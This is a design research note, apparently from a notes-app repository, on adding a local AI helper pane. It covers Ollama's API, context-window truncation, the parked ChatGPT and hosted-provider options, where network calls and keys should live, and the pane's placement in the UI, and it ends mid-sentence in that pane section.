# AI helper pane: research

Findings behind a possible AI helper "window" beside a note. Researched 2026-10-21 against
first-party docs, SDK and server source, and this repo. Facts carry a bracketed source number (see
[Sources](#sources)); repo facts cite a file and line; anything marked **Inference** is my reasoning
from those facts, not something a source states; **unverified** means I could not confirm it. Nothing
here is implemented, and none of it is legal advice. Provider docs, prices and terms move fast (several
sources below changed within the last month), so re-check anything before acting on it.

One limit on this report: `openai.com` and `help.openai.com` answered every automated fetch with HTTP 403
(plain `curl` too). I did not try to get around that. OpenAI's Terms of Use, its "Sign in with ChatGPT
Terms" and the Help Center article are therefore known to me only through a search-engine excerpt, and
are marked [17] to [19]. Read them yourself before building on them.

## Scope (narrowed 2026-10-21): Ollama only

After the first draft the owner cut the scope to **models served by Ollama, either on this machine or on a
self-hosted remote Ollama server**. No ChatGPT, no OpenAI, no hosted provider. The owner then confirmed that
LM Studio, llama.cpp and vLLM also count as local, but as a **later addition**: the first version proves the idea on
Ollama alone (slice 3 below).

**Parked, kept for reference:** A1 (ChatGPT and "Sign in with ChatGPT"), A3 (hosted providers), the library
comparison in A4 as it concerns hosted providers, the API-key custody rows in B, the data-retention table in D, and
slice 3's hosted adapters and SIWC in E1. Their sources stay in the list. Where a later section still talks about
keys or SIWC, read it as parked.

What the narrower scope changes, from Ollama's own docs unless marked **Inference**:

- **Use Ollama's native API as the main adapter, not `/v1`.** Through `/v1` "the OpenAI API has no context-size
  setting" [33], and Ollama's prompt builder drops the oldest messages once the prompt exceeds `NumCtx` [38]. The
  native `POST /api/chat` accepts `options.num_ctx` [36]. The FAQ says the default window is 4096 tokens and can be
  raised per request or with `OLLAMA_CONTEXT_LENGTH` [34] (the context-length page disagrees, see A2 [37]). A note
  placed in the first turn can silently fall out of a 4096-token window. **Inference:** send `num_ctx` explicitly,
  and warn when the estimated prompt will not fit.
- **Wire format: newline-delimited JSON.** With `stream` true (the default) the response is `application/x-ndjson`,
  one JSON object per line, ending with `done: true`; partial text arrives in `message.content` and, for thinking
  models, `message.thinking` [36]. The Chat page does not say whether the final streamed object carries
  `prompt_eval_count` and `eval_count`: its non-streaming schema lists them, its stream schema does not [36].
  **Unverified; check against a live server** before the UI promises token counts. The page also documents no error
  body [36]; a missing model is a 404 `{"error": "model '<name>' not found"}` in source [38].
- **Model list and limits.** `GET /api/tags` lists models [77]. `POST /api/show` returns `model_info`, whose context
  length is keyed by architecture (`llama.context_length` is the one documented example, with the value 8192; the
  naming rule is not stated), and a `capabilities` list (the example shows `completion` and `vision`) [79].
  **Inference:** use these to show the model's maximum window, and to offer images only to models that report
  `vision`.
- **No API key.** Ollama's docs describe no authentication for the server; the FAQ's only security guidance is the
  bind address (`OLLAMA_HOST`) and allowed web origins (`OLLAMA_ORIGINS`) [34]. In compatibility mode a key is
  "required but ignored" [33]. So the key-custody problem (`safeStorage`, backups carrying settings) mostly goes
  away. It comes back only if a remote Ollama sits behind a reverse proxy that demands a token: the FAQ shows Nginx
  in front of Ollama [34] but says nothing about auth on it. **Inference:** keep an optional bearer token out of
  the first slice; if added, B's rules apply (never in `settings.json`, never in backups).
- **"Self-hosted" needs a guard, because Ollama also has cloud models.** Ollama can run models on its own
  cloud. Its FAQ says local use is not seen by Ollama but prompts for cloud-hosted models are processed by the
  service, and that cloud features can be turned off with `OLLAMA_NO_CLOUD=1` or `disable_ollama_cloud` in
  `~/.ollama/server.json` [34]. The cloud page names such models with a `:cloud` suffix and calls `ollama.com` with
  a bearer key or a signed-in app [78]. `/api/tags` marks a remote model only by the presence of `remote_model` and
  `remote_host` [77]; the docs do not say whether a local server's list includes cloud models, or whether a request
  to `localhost:11434` for one is forwarded: **unverified**. **Decided: the picker hides them.** **Inference** on how:
  hide any model that has a `remote_host` or a `:cloud` name, offer no free-text model field in the first version (so
  nothing can bypass the picker), check again at send time, and always show in the panel header where the text is
  going. This is the one way "local only" can silently stop being true; test it against a signed-in Ollama.
- **Where the call lives: unchanged.** Web uses a route handler, desktop main-process IPC, for the reasons in B
  (desktop CSP `connect-src 'self'`; Server Actions run one at a time; no need to set `OLLAMA_ORIGINS` or hit
  mixed-content rules). Ollama's CORS allow-list happens to include `app://*` [38], but the desktop CSP, which is
  this app's own, still blocks the renderer from calling out.
- **A remote Ollama is a base URL, and that is now the whole feature.** The setting is a URL
  (default `http://127.0.0.1:11434` [32]), read from server-side config, never supplied by the renderer or in a
  request (OWASP, SSRF [76]). **Inference:** warn on a plain `http://` URL to a non-loopback host, since the note text
  crosses the network unencrypted, and show the host in the panel header.
- **Privacy is simpler.** With a local Ollama, nothing leaves the machine; with a remote one, the text goes to a
  host the user named. Provider retention and training policies (D) no longer apply. The first-use disclosure
  becomes "this note goes to *host*", not a consent flow about third parties.
- **Hosted web later (decision 11).** **Inference:** a hosted server cannot reach an Ollama on a user's home network,
  so a hosted web build would need the browser to call Ollama directly (`OLLAMA_ORIGINS`, mixed content and Chrome's
  Local Network Access prompt, see B) or a tunnel. The SIWC eligibility worry is gone; this one replaces it.
- **Library choice.** The case for a library gets weaker with one wire format. A hand-written NDJSON reader is a
  few lines, and the AI SDK's OpenAI-compatible provider would go through `/v1`, which cannot set `num_ctx`
  (**Inference**). A community Ollama provider for the AI SDK was not researched.

## Short answers

*The items below were written before the narrowing above. Items 1 and 3 are parked; 2, 4, 5 and 6 still
hold with "provider" read as "Ollama"; 7 is revised.*

**1. What can "connect to ChatGPT" mean?** Two sanctioned things, and they are different products:

- **An OpenAI API key**, metered on a Platform account. Works today, with a documented API [21].
- **"Sign in with ChatGPT" plan usage (SIWC).** OAuth by which a user lets an app run Responses API requests
  against their ChatGPT plan, with no API key. OpenAI's developer docs open it to "open-source and locally
  hosted apps", call it a preview, and route paid or remotely hosted apps to an interest form [2][5][13].
  The docs are undated; OpenAI's DevKit repository was created 2026-09-29 [14]. This repo is public and
  MIT-licensed (`LICENSE`), so it plausibly counts (**Inference**: the docs never define "open-source" [2]).
  The terms that govern SIWC are on a page I could not read [18], and the DevKit is under a noncommercial
  license [14].

Nothing else is sanctioned that I could find. Codex's own sign-in is for Codex [15]; OpenAI maintainers
answered only generally when asked whether other apps may reuse it [16]; the Apps SDK points the other way,
connecting external systems *into* ChatGPT [20]. Do not build on a scraped chatgpt.com session, on Codex's
`~/.codex/auth.json`, or on a proxy that borrows Codex's OAuth client. And yes, the two billing paths are
separate: OpenAI's docs describe ChatGPT sign-in as "subscription access" and API-key use as billed on the
Platform account at standard API rates [15], and SIWC advertises plan usage "without providing an API key" [1].

**2. Can a user bring their own model?** Yes, cheaply. Ollama, LM Studio, llama.cpp's `llama-server` and vLLM
all serve OpenAI-style `/v1/chat/completions` and `/v1/models` [33][39][42][44]. "Base URL + optional key + model
name" covers plain chat on all of them. It leaks in four verified places: Ollama's context size cannot be set
through `/v1` and it silently drops the oldest messages when the prompt does not fit [33][38]; what `/v1/models`
returns differs per server [24][42][4]; system-role handling differs per provider [46][5]; and CORS defaults differ
widely [38][40][42][43].

**3. One adapter or a library?** **Inference:** a thin hand-written `ChatProvider` interface over `fetch` in the
shared data layer, with an OpenAI-compatible adapter first, then Anthropic-native and OpenAI-Responses adapters.
The Vercel AI SDK is a credible alternative for the web UI (a custom `ChatTransport` can carry IPC [57]) but is a
three-package tree that peers on `zod`, changes daily [53], and does nothing for the CLI.

**4. Where does the network call live?** Not in the renderer or browser: OpenAI says not to expose keys in
"browsers or apps" [28], and the desktop CSP already forbids it (`connect-src 'self'`,
[`protocol.ts`](../apps/desktop/src/main/protocol.ts) line 24). Desktop: main process, streamed to the renderer over IPC.
Web: a Next **route handler**, not a Server Action, because Next dispatches Server Actions one at a time per
client [61], so a minutes-long stream would queue behind (and delay) note autosaves. CLI: straight from its process.
One shared provider module can serve all three; only the carrier differs.

**5. Where does it sit in the UI?** **Inference:** a dock inside `NotePane`, to the right of the editor/preview,
toggled from the pane header next to Find. It is "about" exactly the pane's note, reuses `ResizeHandle` and the
`useMinWidth` degrade-gracefully rule, and does not disturb `panes.ts`, which the CLI shares.

**6. "Never inject into the note."** Structurally: the panel gets the note as a read-only string and no `onChange`.
Closest existing safe mechanism: clipboard copy ([`PreviewHighlightMenu.tsx`](../apps/web/src/components/notes/PreviewHighlightMenu.tsx)
line 35). Whether even a Copy or Insert button is acceptable is yours to decide (see [E](#e-feasibility-slicing-and-open-questions)).
Separately, **do not reuse `NoteMarkdown` for chat bubbles**: it shows any `https:` image automatically
([`NoteImage.tsx`](../apps/web/src/components/notes/NoteImage.tsx) lines 11 to 13), which is the documented
markdown-image exfiltration route [74][75].

**7. Smallest slice.** Web and desktop, Ollama's native `/api/chat` adapter, a base-URL setting (local by default,
remote allowed), a model picker from `/api/tags`, an explicit `num_ctx`, an in-memory conversation per note, note and
selection as context, no tools, restricted Markdown renderer, and *Copy* / *New note from this* on each answer
(decided 2026-10-21; see E3). Persistence is the next slice; the CLI is out for now.

## A. Providers

### A1. "Connect to ChatGPT"

**(a) OpenAI API with the user's key.**

| Question | Answer |
|---|---|
| Which API? | OpenAI recommends Responses "for all new projects"; Chat Completions "is still supported" [21]. |
| Streaming format | HTTP server-sent events. Responses sends typed events (`response.created`, `response.output_text.delta`, `response.completed`, `error`; `response.failed` also exists) [22]. Chat Completions sends `chat.completion.chunk` objects with `choices[].delta.content` and a `finish_reason` on the last one; with `stream_options.include_usage` a final chunk with empty `choices` carries token totals, and "if the stream is interrupted, this final chunk may not arrive" [23]. The official Node SDK ends a stream at `data: [DONE]` [31]. |
| Listing models | `GET /v1/models` returns `{object: "list", data: [{id, object, created, owned_by, shutdown_date?}]}`. The page does not say whether it is filtered to chat-capable models [24], so the picker cannot assume it is (**Inference:** let the user type a model name too). |
| Errors | 401 bad key or wrong org; 403 unsupported region; 429 splits into rate limit (honor `Retry-After`, back off with jitter) and billing or quota (`credit_balance_exhausted`, spend limits: "Retrying ... won't restore API access"); 500; 503 overloaded [25]. Limit headers `x-ratelimit-*` and `Retry-After`; limits are per organization and project, not per user; failed requests still count [26]. `x-request-id` identifies a request for support [28]. |
| Data | API data is not used for training by default; abuse-monitoring logs are kept up to 30 days; Responses `store` defaults on and keeps application state 30 days, so send `store: false`; Zero Data Retention and Modified Abuse Monitoring need OpenAI approval [21][27]. |
| Key hygiene | "Don't ... expose it in any client-side code such as browsers or apps" [28]. The `openai` SDK refuses to run in a browser unless `dangerouslyAllowBrowser` is set [31]. |

**Inference:** a Chat Completions adapter reaches every provider in A2 and A3, and the OpenAI endpoint still
accepts it; a Responses adapter is only *required* for SIWC (below). If OpenAI ever retires Chat Completions,
only the OpenAI route of adapter 1 breaks. I found no such announcement.

**(b) Using a ChatGPT subscription instead of a metered key.**

*What exists and is documented.* SIWC "ChatGPT plan usage" [1][2]:

- **Who:** "open to all open-source partners and selected private clients"; commercial partners are in a
  "limited trial"; "paid or remotely hosted" apps "must join a waitlist" [1][12][13]. The user needs Plus or
  Pro per the developer docs [1][13]. The Help Center article, which I could not fetch, is reported by a search
  excerpt to say Go, Plus or Pro [17]. **The sources disagree; unverified.**
- **Flow:** OpenID Connect with PKCE, no client secret ("a public client without a secret"). The first sign-in
  opens `auth.openai.com/api/accounts/authorize` in the system browser with `client_id=dynamic_agent_client`, a
  stable per-install `ext_agent_host_id` and scopes `openid profile email offline_access resource.invoke
  chatgpt.tokens.use.direct`. The redirect must be a loopback listener on `127.0.0.1` ("Do not substitute
  `localhost`") with a fixed path; the port may change between sign-ins [3]. OpenAI issues a per-registration
  client id (`oaiapp_...`) during the flow [3].
- **Tokens:** access token one hour; refresh token 30 days, replaced on every refresh [8]. Keep them in "protected
  local" storage, written atomically with owner-only permissions, never in browser storage, logs or analytics
  [3][7]. In OpenAI's own Electron example the main process holds the tokens and the UI gets a bridge without them [13].
- **Request shape:** `POST https://api.openai.com/v1/responses` with the access token as the bearer, `store: false`,
  `stream: true`; "do not point it at ChatGPT's `backend-api`" [4][5]. Over HTTP the history goes in `input` (no
  `previous_response_id`); `system` items are rejected, so use `instructions`; `temperature`, `top_p`,
  `max_output_tokens`, `user`, `metadata`, `truncation` and others are unsupported; no hosted tools; images and
  files allowed if the model takes them [5]. `GET /v1/models` with the same token returns a `models` array (filter
  `visibility == "list"`, show `display_name`, send `slug`), not `data` [4].
- **Errors:** plan errors stop the request, and OpenAI says it does not silently switch to another billing path. Usage-limit errors
  (`subscription_sharing_usage_limit_exceeded`, 429) can arrive as `response.failed` *after* streaming has begun [4][6].
- **Duties:** show "Using ChatGPT plan" and a Manage usage link near the composer, a one-time welcome modal, and the
  active account in settings [7][11]. The usage limit "may apply to the plan or to the app" [11].
- **Where it may run:** the docs cover "open-source and locally hosted apps" [2]. The only remote case they document is a VM
  that receives credentials copied from a local sign-in, and per-host usage attribution and revocation "are not yet
  available" for it [9].
- **Alternative integration:** run `codex app-server` as a child process with the token in its environment [10].
  **Inference:** not a fit for a notes helper (it brings a whole agent runtime), but it exists.

*What I could not read, and why it matters.* The governing "Sign in with ChatGPT Terms" [18]. A search excerpt of
them says: tokens may be obtained only through the supported flow; plan-usage requests must come from the user's
own runtime and be tied to that user's activity; no general-purpose API access for other tools; no account
rotation to dodge limits. **Unverified.** **Inference:** a helper that sends one user's request from that user's
own app instance fits those rules, but only the real text can settle it.

*Licensing trap.* OpenAI's DevKit (`@siwc/local`, `@siwc/react`) is under a "Noncommercial License v1.0" that
"grants no access to ChatGPT, the OpenAI API, or any other OpenAI service"; separate terms govern those [14]. The
packages are not on npm (HTTP 404 for `@siwc/*`) [14][13]. **Inference:** do not vendor the DevKit into an
MIT project that might one day be sold; the flow is fully specified in the docs and is small enough to implement.

*What is not sanctioned, as far as I can verify.*

| Approach | Status |
|---|---|
| Reuse Codex CLI's `~/.codex/auth.json` or its OAuth client in another app | No OpenAI statement found. Maintainers answered only that forking Codex is welcome and that they are "not qualified" on terms; later questions about distributing apps went unanswered [16]. Codex's doc covers Codex itself [15]. Treat as unsanctioned. |
| Scrape or drive chatgpt.com, or proxy a ChatGPT login as an API | The consumer Terms of Use is reported (excerpt only) to prohibit programmatically extracting Output [19]. Unverified; do not build. |
| Community "OpenAI-compatible localhost proxy" tools built on ChatGPT logins | Third-party, not OpenAI documentation. Not evidence of permission. |
| Apps SDK / MCP "apps in ChatGPT" | The reverse direction: an MCP server that ChatGPT or Codex calls [20]. Could be a separate future feature (expose notes to ChatGPT); it does not let Composition call ChatGPT. |

**What SIWC would change in the design (Inference).** It is a Responses-only, stream-only, stateless provider with
a reduced field set, so the request builder must omit fields per provider. It needs a loopback listener, a system
browser launch, and a token store with refresh. Refresh tokens rotate and OpenAI lists `refresh_token_reused` as an
unusable-token error [6][8], so **each product should sign in separately and keep its own token file**; do not
share one credential between the CLI, web and desktop apps. A multi-user hosted web app would fall outside the open-source path [2][13].

### A2. Bring your own model

Verified against each project's own docs or source on 2026-10-21.

| Server | Default address | OpenAI-style endpoints | Models | Browser CORS default | Auth |
|---|---|---|---|---|---|
| **Ollama** | `127.0.0.1:11434`, native `/api`, compat `/v1` [32][34][38] | `/v1/chat/completions`, `/v1/responses` (since v0.13.3, no stateful features), `/v1/completions`, `/v1/embeddings` [33]; native `/api/chat`, NDJSON, `stream` defaults true [35][36] | `/v1/models`, native `GET /api/tags` [33][38] | Allows `http(s)://localhost`, `127.0.0.1`, `0.0.0.0` on any port plus `app://*`, `file://*`, `tauri://*`, `vscode-webview://*`, `vscode-file://*`; extend with `OLLAMA_ORIGINS` [38]. The FAQ prose lists fewer [34]: the source is the better guide. It also checks the `Host` header [38]. | None locally; in compat mode the key is "required but ignored" [33] |
| **LM Studio** | Docs examples use `localhost:1234/v1`; they never call it the default [39][40] | `/v1/models`, `/v1/chat/completions`, `/v1/responses`, `/v1/completions`, `/v1/embeddings` [39] | `/v1/models` | Off unless "Enable CORS" is ticked [40] | API tokens exist (0.4.0+) but are off by default [41] |
| **llama.cpp** `llama-server` | `127.0.0.1:9931` on master, in both the README and `common/common.h`; the README's Docker examples use 8080 [42] | `/v1/chat/completions`, `/v1/responses`, `/v1/completions`, Anthropic-style `/v1/messages`, token counting endpoints. "No strong claims of compatibility with OpenAI API spec" [42] | `/v1/models` returns **one** element whose `id` defaults to the model file path (`--alias` to change) [42] | `--cors-origins` default `*` [42] | `--api-key`, optional [42] |
| **vLLM** | Port 8000 (`vllm serve --port`) [43] | `/v1/chat/completions`, `/v1/completions`, `/v1/responses`, `/v1/embeddings`, Anthropic-style `/v1/messages` [44] | `/v1/models` [44] | `--allowed-origins` default `[]`, i.e. none [43] | `--api-key`, optional [43] |

Version note: an older llama.cpp default of 8080 is from memory, not from a source I read; check `llama-server --help`.

**What the abstraction covers.** `POST {base}/chat/completions` with `{model, messages, stream: true}` returning SSE
chunks, `GET {base}/models`, and an optional `Authorization: Bearer`. Send only those fields: servers disagree about
the rest (Ollama does not support `n`, `user`, `tool_choice` or image URLs [33]; Anthropic's layer ignores `store`, `seed`
and more, and on Claude 4.7+ models returns 400 for `temperature` below 1 or a non-default `top_p` [46]).

**Where it leaks (all from the cited docs or source):**

| Leak | Detail |
|---|---|
| **Context size, and silent truncation** | Through `/v1` "the OpenAI API has no context-size setting"; set `num_ctx` in a Modelfile [33]. Native `/api/chat` accepts `options.num_ctx` [36]. Ollama's default is disputed by its own docs: the FAQ says 4096 tokens [34]; the context-length page says 4k, 32k or 256k by VRAM tier [37]. In source, `chatPrompt` removes the oldest messages until the prompt fits `NumCtx`, keeping system messages and the last message [38]. A long note placed in an early user turn can vanish from the model's view without any error. **Inference:** put the note in the system message or the latest turn, and show a context gauge. |
| **Model list shape and meaning** | OpenAI's list may include non-chat models [24]; llama.cpp lists one model with a file path as `id` [42]; Ollama sets `owned_by: "library"` [33]; SIWC returns `models` with `slug` and `display_name` [4]. |
| **Streaming usage** | Needs `stream_options.include_usage`: documented for Ollama [33] and Anthropic's layer [46]; I found nothing for llama.cpp, vLLM or LM Studio, so **unverified**. The AI SDK defaults `includeUsage` off [56]. Ollama's native stream ends with `done`, `done_reason`, `prompt_eval_count`, `eval_count` on the response schema [36]; whether the final stream event repeats them is **unverified**. |
| **System role** | Anthropic's layer hoists every system or developer message into one top-level `system` string [46]; SIWC rejects `system` items and wants `instructions` [5]; Ollama's compat page is silent [33]; vLLM errors on every chat request if the model has no chat template [44]. |
| **Images** | Ollama takes only base64 images in compat mode [33]; Anthropic's layer takes `image_url` [46]; support depends on the model. |
| **Reasoning text** | Some models stream reasoning separately (the AI SDK mentions DeepSeek R1 [56]); Anthropic's layer does not return thinking [46]. The renderer must not assume everything streamed is the answer. |
| **Errors** | Ollama: 404 `{"error": "model '<name>' not found"}` when not pulled [38]. Anthropic: `event: error` with `overloaded_error` in the stream [47]. OpenRouter: `{code, message, metadata}`, also inside a choice [52]. |

### A3. Other hosted providers

| Provider | Use via | Notes |
|---|---|---|
| **Anthropic Messages API** | Native adapter (different wire format) | `POST https://api.anthropic.com/v1/messages`; headers `x-api-key` (legacy fallback for `Authorization: Bearer`), `anthropic-version`, `content-type` [45]. SSE with named events: `message_start`, `content_block_delta` with `text_delta`, `message_delta` (cumulative usage), `message_stop`, `ping`, `error` [47]. `GET /v1/models` includes `max_input_tokens` [50]; `POST /v1/messages/count_tokens` counts before sending [45]. Current models list a 1M-token window and 128K max output [50]. |
| Anthropic via OpenAI SDK | Possible, not advised | Anthropic calls it "primarily intended to test and compare", "not ... production-ready for most use cases" [46]. |
| **Gemini** | OpenAI-compatible: `https://generativelanguage.googleapis.com/v1beta/openai/` | Chat, models, embeddings; the OpenAI support is "still in beta" [51]. |
| **OpenRouter** | OpenAI-compatible: `https://openrouter.ai/api/v1` | One key reaches many models; ids look like `org/model`; the stream may carry comment lines to ignore, with usage in the last chunk before `[DONE]` [52]. |

Browser access to Anthropic: the TypeScript SDK blocks browsers unless `dangerouslyAllowBrowser` is set, and then
sends `anthropic-dangerous-direct-browser-access: true` (SDK source) [49]. Anthropic's pages that I fetched do not
document a CORS policy; its data-retention page says CORS "is not supported for organizations with ZDR" and to use
a backend proxy [48], from which **Inference** says CORS is available otherwise. Treat browser-direct access as
unverified and avoid it.

Data policy for Anthropic's API: "Retained data is never used for model training without your express permission";
conversation content is not retained by default, except for "Covered Models", which require 30-day retention
[48]. Which models are covered changes (the page names several current ones); re-read it per model.

### A4. Recommendation on the abstraction

Candidates, judged against this repo's constraints. All figures are npm registry metadata on 2026-10-21 [53];
`unpacked` is the tarball's `unpackedSize`, **not** a bundle size.

| Option | Facts | Fit (**Inference**) |
|---|---|---|
| **Hand-rolled `fetch` + SSE** | The three wire formats are small: `data: {json}` lines ending `[DONE]` [31]; Ollama NDJSON [35]; Anthropic named events [47]. | Zero dependencies; runs unchanged in Next's Node, Electron's main (Node 24) and the CLI (Node 26); lives in the shared data layer that [`shared-core-plan.md`](shared-core-plan.md) wants to depend only on Node built-ins; easy to test against a local fake server; room for per-provider quirks (SIWC, `num_ctx`). Cost: we own SSE edge cases (chunk boundaries, multi-line data, `:` comments [52], abort). |
| **Vercel AI SDK** | `ai` 7.0.148, `@ai-sdk/react` 4.0.152, `@ai-sdk/openai-compatible` 3.0.75, all Apache-2.0, all published the day I looked, Node >= 22; `ai` and the providers peer on `zod`; unpacked 8.3 MB, 0.33 MB, 0.42 MB [53]. `useChat` returns `messages`, `sendMessage`, `status` (`submitted`, `streaming`, `ready`, `error`), `error`, `stop`, `regenerate`; messages are `parts` arrays [55]. Default transport POSTs to `/api/chat`; a custom `ChatTransport.sendMessages` returns `Promise<ReadableStream<UIMessageChunk>>` [54][57]. `createOpenAICompatible({name, baseURL, apiKey, headers, fetch, includeUsage, ...})` [56]. | Good for the web UI and, with a custom IPC transport, for desktop. Poor fit for the CLI (no HTTP route; `@ai-sdk/react` under OpenTUI's React renderer is **unverified**). Adds `zod` (not a dependency of any app today) and a daily-release tree to pin; every new runtime package must also be added to the roots in [`collect-licenses.mjs`](../apps/desktop/scripts/collect-licenses.mjs) (per [`web-components.md`](ui/web-components.md)). Whether its OpenAI provider can express SIWC's restricted Responses request is **unverified**. |
| **`openai` SDK** | 7.41.0, Apache-2.0, unpacked 22.8 MB, Node >= 22, `baseURL` override, browser opt-in only [53][31]. LM Studio's docs also say to reuse OpenAI clients by changing the base URL [39]. | Fine in main/route/CLI, never in the renderer. Heavy for what we use; no UI help; a second SDK is needed for Anthropic. |
| **`@anthropic-ai/sdk`** | 1.0.0 (published hours before I looked), Apache-2.0, unpacked 14.9 MB [53][49]. | Only worth it with a native Anthropic adapter; a 1.0.0 released that day is a reason to wait and pin. |

**Recommendation (Inference).** A small `ChatProvider` seam:
`streamChat(request, signal): AsyncIterable<ChatEvent>` with events `delta | usage | done | error`, one module per
wire format (OpenAI-compatible Chat Completions first; Anthropic Messages and OpenAI Responses later), configured
by `{ kind, baseUrl, model, apiKey? }`. Keep the React side to a small own hook (in-memory list plus status). If
you would rather not own the SSE parser, the AI SDK is the one library that spans web and desktop UI; choose it
knowing the CLI would still need the hand-rolled path.

## B. Where the network call lives

### Why not the browser or renderer

- **Keys:** OpenAI says never in client-side code [28]; the SDKs gate browsers behind `dangerouslyAllowBrowser` [31][49].
- **CORS:** a JSON POST with `Authorization` is preflighted, and the server must opt in [67]. Local servers differ
  (table in A2): Ollama yes for localhost origins, llama.cpp yes (`*`), LM Studio only if "Enable CORS" is on, vLLM
  no by default. A failed preflight surfaces to script as a generic network error (**Inference**), so users could
  not be told why.
- **Mixed content:** a fetch from an https page to an http URL is blocked [68]. MDN says loopback counts as a
  secure origin but does not say whether an https page may call `http://localhost`; the W3C draft defers to the
  Secure Contexts spec [69]; Chrome's Local Network Access adds a permission prompt for public-to-loopback requests
  ("launching in Chrome 142"; whether it shipped is unconfirmed) [70]. **Unresolved.** Moot while the web app is a
  local `http://localhost:3000` server ([`product-builds.md`](product-builds.md) lists web distribution as undecided).
- **Desktop CSP:** `connect-src 'self'` with the comment "no network access for scripts: all data goes over IPC"
  ([`protocol.ts`](../apps/desktop/src/main/protocol.ts) lines 12 to 24). Loosening it for providers would undo the posture.

### Per product

| | Web (Next, local server) | Desktop (Electron, static export) | CLI (OpenTUI, Node 26) |
|---|---|---|---|
| **Path** | Browser to a streaming **route handler** `POST /api/assistant/chat` to the provider | Renderer to main over IPC to the provider; chunks pushed back with `webContents.send` | Process to provider |
| **Why not the alternative** | Server Actions are dispatched "one at a time per client" [61], and note autosave is itself a Server Action (`saveNoteContent`, [`actions.ts`](../apps/web/src/lib/composition/actions.ts) line 43, 500 ms debounce at [`NotesApp.tsx`](../apps/web/src/components/notes/NotesApp.tsx) line 52). A long stream would hold autosave back. The guide describes one response carrying the action's return value (and a re-rendered route); it documents no incremental streaming of a result [61]. A static export has no Server Actions at all, and no route handlers that read the request [60]. | `invoke` returns once; streaming needs main-to-renderer sends, with a wrapper that does not leak `event.sender` [66]. Electron's checklist also asks for sender validation on every IPC message and no raw IPC exposed by the preload [65]; [`ipc.ts`](../apps/desktop/src/main/ipc.ts) already validates senders. The repo already does this for update state ([`preload/index.ts`](../apps/desktop/src/preload/index.ts) lines 22 to 26, [`channels.ts`](../apps/desktop/src/shared/channels.ts) line 8). | none |
| **Streaming** | Route handlers can return a `Response` built from a `ReadableStream` [62] | `webContents.send(chunk)` keyed by request id, plus an abort call | native `fetch` stream |
| **CORS / CSP** | Same origin to the route; the route calls out server-side, so provider CORS is irrelevant | None for main-process calls; CORS is a browser mechanism [67]. CSP unchanged. Main can use Node's `fetch` (the sun-times lookup in [`sunTimes.ts`](../apps/web/src/lib/composition/sunTimes.ts) already does, lines 17 to 18) or `net.fetch`, which uses Chromium's network stack and system proxy settings and only works after `ready` [64] | none |
| **Key storage** | Today's settings file is plaintext JSON written with default permissions ([`webSettings.ts`](../apps/web/src/lib/composition/webSettings.ts) lines 158 to 168). **Do not put a key in `WebSettings`**: backups carry every setting except the two location fields ([`backup.ts`](../apps/web/src/lib/composition/backup.ts) line 143), so a key would be written into every `.tar.gz` and restored onto other machines. Also, `parseWebSettings` drops unknown fields (line 97), so a new field must be added to the type to survive a save. Use an env var, or a separate `ai.json` written `0600`. | Electron `safeStorage` [63]: Keychain on macOS; DPAPI on Windows ("not protected ... from other apps running in the same userspace"); a Linux secret store, or, with none, `basic_text`, "unprotected ... hardcoded plaintext password" (check `getSelectedStorageBackend()`). Prefer the async API; macOS apps should be code-signed or the Keychain may re-prompt on each update. Store the encrypted blob under `userData`, outside `settings.json` and outside backups. Signing is not done yet ([`desktop-app-plan.md`](desktop-app-plan.md) build status). | Env var, or a `0600` file such as `~/.composition-cli/ai.json`, which is also what OpenAI prescribes for OAuth tokens [3] and one of the two stores Codex offers (`auth.json` or the OS credential store) [15]. `keytar` is archived (last push 2022-12-12); `@napi-rs/keyring` is maintained, but is one more native module for a bundle that ships signed inside the desktop app [59] (**Inference**). |
| **SSRF** | See below | The renderer must never supply a URL: [`updatesApi.ts`](../apps/web/src/lib/composition/updatesApi.ts) already states "The renderer never supplies a URL or a path". Main reads provider config from its own store | n/a |

**Web request guard.** A route handler has none of Server Actions' built-in `Origin` check [61]. The repo already
solved this for uploads: [`uploadGuard.ts`](../apps/web/src/lib/composition/uploadGuard.ts) requires a custom header
plus `Origin` equal to `Host`, because "any web page the user visits could POST a file to `localhost`". The chat
route spends the user's money and sends their notes out, so it needs the same guard and `export const dynamic = "force-dynamic"`,
as [`attachments/route.ts`](<../apps/web/src/app/api/notes/[noteId]/attachments/route.ts>) does.

**SSRF.** The web server would make requests to a user-configured base URL. Is the web app ever hosted for several
users? The docs say web distribution is "Undecided" ([`feature-matrix.md`](feature-matrix.md)) and that it "should
not depend on the local files" later ([`product-builds.md`](product-builds.md)), with "How should a potential web
application be handled?" still open ([`index.md`](index.md)). Today it is a single-user local server. Then the
user already controls both ends, and the real threat is a hostile web page or DNS-rebinding request steering the
local server. **Inference:** follow OWASP's first rule, "Do not accept complete URLs from the user" [76]: the route
takes only a conversation and message text and reads the base URL from saved server-side config, behind the guard
above. A private-range blocklist cannot apply, since localhost is the point. If a multi-user hosted web app is ever
planned, this section, key custody and SIWC eligibility [2][13] all need redoing.

**One shared transport?** Yes, at two levels. (1) The provider module (A4) uses only `fetch`, `ReadableStream` and
`TextDecoder`, so the same code runs in Next's Node process, Electron's main process and the CLI. (2) The UI talks to
a small `AssistantClient` seam in the style of [`client.ts`](../apps/web/src/lib/composition/client.ts) /
`client.desktop.ts`: `send(request): AsyncIterable<event>` plus abort, backed by `fetch` to the route on web and by
the preload bridge on desktop. The CLI skips the seam and calls the provider module directly. Desktop-only
contracts already follow this shape ([`updatesApi.ts`](../apps/web/src/lib/composition/updatesApi.ts) with
`updatesClient.ts` / `updatesClient.desktop.ts`), including argument validators in
[`validate.ts`](../apps/desktop/src/main/validate.ts) and sender checks in [`ipc.ts`](../apps/desktop/src/main/ipc.ts).

## C. The pane

### C1. How the split is built, and where an assistant could go

**Today.**

- [`PaneArea.tsx`](../apps/web/src/components/notes/PaneArea.tsx) is one flex row of `NotePane`s with a `ResizeHandle`
  between each pair (lines 49 to 74). Each pane is `flex: <size> 1 0%` with `minWidth: MIN_PANE_WIDTH` (240,
  [`panes.ts`](../apps/web/src/components/notes/panes.ts) line 30); below that the row scrolls (line 48).
- [`NotePane.tsx`](../apps/web/src/components/notes/NotePane.tsx) is a header (draggable, Find, Close; lines 166 to 199),
  [`EditorTabs`](../apps/web/src/components/notes/EditorTabs.tsx), an optional find bar,
  [`MarkdownEditor`](../apps/web/src/components/notes/MarkdownEditor.tsx), and the attachments panel. It measures its own
  width with `useMinWidth(section, SIDE_BY_SIDE_MIN_WIDTH)` (line 68; 480, `panes.ts` line 33) and passes
  `shownView(view, canSplit)` down (lines 200 and 223). Below 480 px "split" is shown as "markdown", the Split tab
  disappears (`EditorTabs.tsx` line 32), and the stored choice returns when the pane widens
